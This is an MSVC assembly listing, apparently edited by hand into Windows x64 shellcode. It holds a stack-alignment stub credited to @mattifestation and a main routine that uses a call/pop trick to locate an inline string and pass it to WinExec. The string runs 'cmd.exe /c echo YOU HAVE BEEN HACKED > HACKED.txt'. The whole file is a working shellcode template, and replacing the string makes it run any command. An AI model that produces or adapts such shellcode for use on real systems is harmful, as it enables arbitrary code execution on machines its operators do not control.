; Listing generated by Microsoft (R) Optimizing Compiler Version 19.29.30140.0 

include listing.inc

; INCLUDELIB LIBCMT
; INCLUDELIB OLDNAMES

PUBLIC	main
EXTRN	__imp_WinExec:PROC
; Function compile flags: /Odtp
PUBLIC  AlignRSP
_TEXT SEGMENT
	; AlignRSP - by @mattifestation (http://www.exploit-monday.com/2013/08/writing-optimized-windows-shellcode-in-c.html)
	; AlignRSP is a simple call stub that ensures that the stack is 16 - byte aligned prior
	; to calling the entry point of the payload.This is necessary because 64 - bit functions
	; in Windows assume that they were called with 16 - byte stack alignment.When amd64
	; shellcode is executed, you can't be assured that you stack is 16-byte aligned. For example,
	; if your shellcode lands with 8 - byte stack alignment, any call to a Win32 function will likely
	; crash upon calling any ASM instruction that utilizes XMM registers(which require 16 - byte)
	; alignment.

	AlignRSP PROC
	push rsi; Preserve RSI since we're stomping on it
	mov  rsi, rsp; Save the value of RSP so it can be restored
	and  rsp, 0FFFFFFFFFFFFFFF0h; Align RSP to 16 bytes
	sub  rsp, 020h; Allocate homing space for ExecutePayload
	call main; Call the entry point of the payload
	mov  rsp, rsi; Restore the original value of RSP
	pop  rsi; Restore RSI
	ret; Return to caller
	AlignRSP ENDP
_TEXT ENDS

_TEXT	SEGMENT
main	PROC
; File C:\Users\Shayan Jadoon\source\repos\Project8\Project8\Source.cpp
; Line 4
$LN3:
	sub	rsp, 40					; 00000028H
; Line 5
	mov	edx, 1
	CALL after_$SG90714
$SG90714 DB	'cmd.exe /c echo YOU HAVE BEEN HACKED > HACKED.txt', 00H
after_$SG90714:
	POP  rcx

; 	lea	rcx, OFFSET FLAT:$SG90714
	call	QWORD PTR __imp_WinExec
; Line 6
	xor	eax, eax
; Line 7
	add	rsp, 40					; 00000028H
	ret	0
main	ENDP
_TEXT	ENDS
END
